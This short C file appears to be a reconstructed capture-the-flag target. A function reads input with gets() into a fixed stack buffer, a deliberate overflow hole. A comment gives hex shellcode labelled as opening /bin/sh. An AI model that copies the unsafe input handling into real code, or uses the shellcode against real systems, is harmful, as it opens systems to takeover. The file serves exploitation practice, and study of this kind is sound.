#include <unistd.h>
#include <libc.h>

void p()
{
	char buf[76];
	void *ptr;

	fflush(stdout);
	gets(buf);
	ptr = buf - 4;
	if ((int)ptr & 0xb0000000)
	{
		printf("(%p)", ptr);
		exit(1);
	}
	puts(buf);
	strdup(buf);
}

int main()
{
	p();
}

/* Open /bin/sh
 * 31c0 31db 31c9 31d2 b00b 5368 6e2f 7368
 * 682f 2f62 6989 e3cd 80b0 0131 dbcd 8000
*/
